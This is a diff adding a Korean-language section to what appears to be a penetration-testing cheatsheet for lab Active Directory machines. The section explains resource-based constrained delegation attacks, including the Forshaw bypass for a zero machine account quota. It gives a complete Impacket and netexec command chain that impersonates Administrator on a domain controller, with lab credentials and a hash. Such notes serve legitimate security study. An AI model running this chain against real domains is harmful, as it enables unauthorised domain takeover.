@@ -1128,3 +1128,75 @@ netexec ldap DC.sendai.vl -u Thomas.Powell -p 0xdf0xdf.... --gmsa
 ```
   
 </details>
+
+---
+<details>
+  <summary><strong>AddAllowedToAct</strong></summary>
+
+## Machine Account Quota (MAQ) 확인
+
+```bash
+netexec ldap dc.phantom.vl -u wsilva -p 0xdf0xdf -M maq
+```
+
+| MAQ 값 | 의미 |
+|--------|------|
+| `10` (기본값) | 일반 유저도 컴퓨터 객체 10개까지 추가 가능 |
+| `0` | 컴퓨터 객체 추가 불가 → 일반 RBCD 불가 |
+
+> MAQ=0이어도 RBCD 자체가 막히는 것은 아님.  
+> 새 컴퓨터 객체 **생성**만 불가한 것이므로 우회 방법 필요.
+
+## 일반적인 RBCD 공격 흐름 (MAQ > 0)
+
+```
+1. AddAllowedToAct 권한 확인 (BloodHound)
+        ↓
+2. 새 컴퓨터 객체 생성 (SPN 자동 부여)
+        ↓
+3. 타겟 서버의 AllowedToAct에 새 컴퓨터 등록
+        ↓
+4. S4U2Self + S4U2Proxy로 Administrator 티켓 발급
+        ↓
+5. 타겟 서버 접근
+```
+
+## MAQ=0 환경 우회: Forshaw 기법
+
+### 핵심 아이디어
+
+```
+유저의 NTLM 해시 == TGT 세션 키
+→ 이 조건이 맞으면 SPN 없이도 S4U2Self가 작동
+```
+
+### 상세 공격 흐름
+
+```
+1. TGT 획득 → wsilva.ccache 생성
+        ↓
+2. describeTicket으로 TGT 세션 키 추출
+        ↓
+3. changepasswd로 패스워드 변경
+   (새 NTLM 해시 = TGT 세션 키)
+        ↓
+4. AllowedToAct에 wsilva 자신을 등록
+        ↓
+5. getST.py -u2u 로 Administrator 서비스 티켓 발급
+        ↓
+6. Administrator로 타겟 서버 접근
+```
+
+```bash
+rbcd.py -delegate-to 'DC$' -delegate-from wsilva -action write phantom/wsilva:0xdf0xdf -dc-ip 10.129.234.63
+
+getTGT.py phantom.vl/wsilva:0xdf0xdf
+
+describeTicket.py wsilva.ccache
+
+changepasswd.py -newhashes :d777c9fe8cdbfbadca48b671967f54e7 phantom/wsilva:0xdf0xdf@dc.phantom.vl
+
+KRB5CCNAME=wsilva.ccache getST.py -u2u -impersonate Administrator -spn cifs/DC.phantom.vl phantom.vl/wsilva -k -no-pass
+```
+  
+</details>
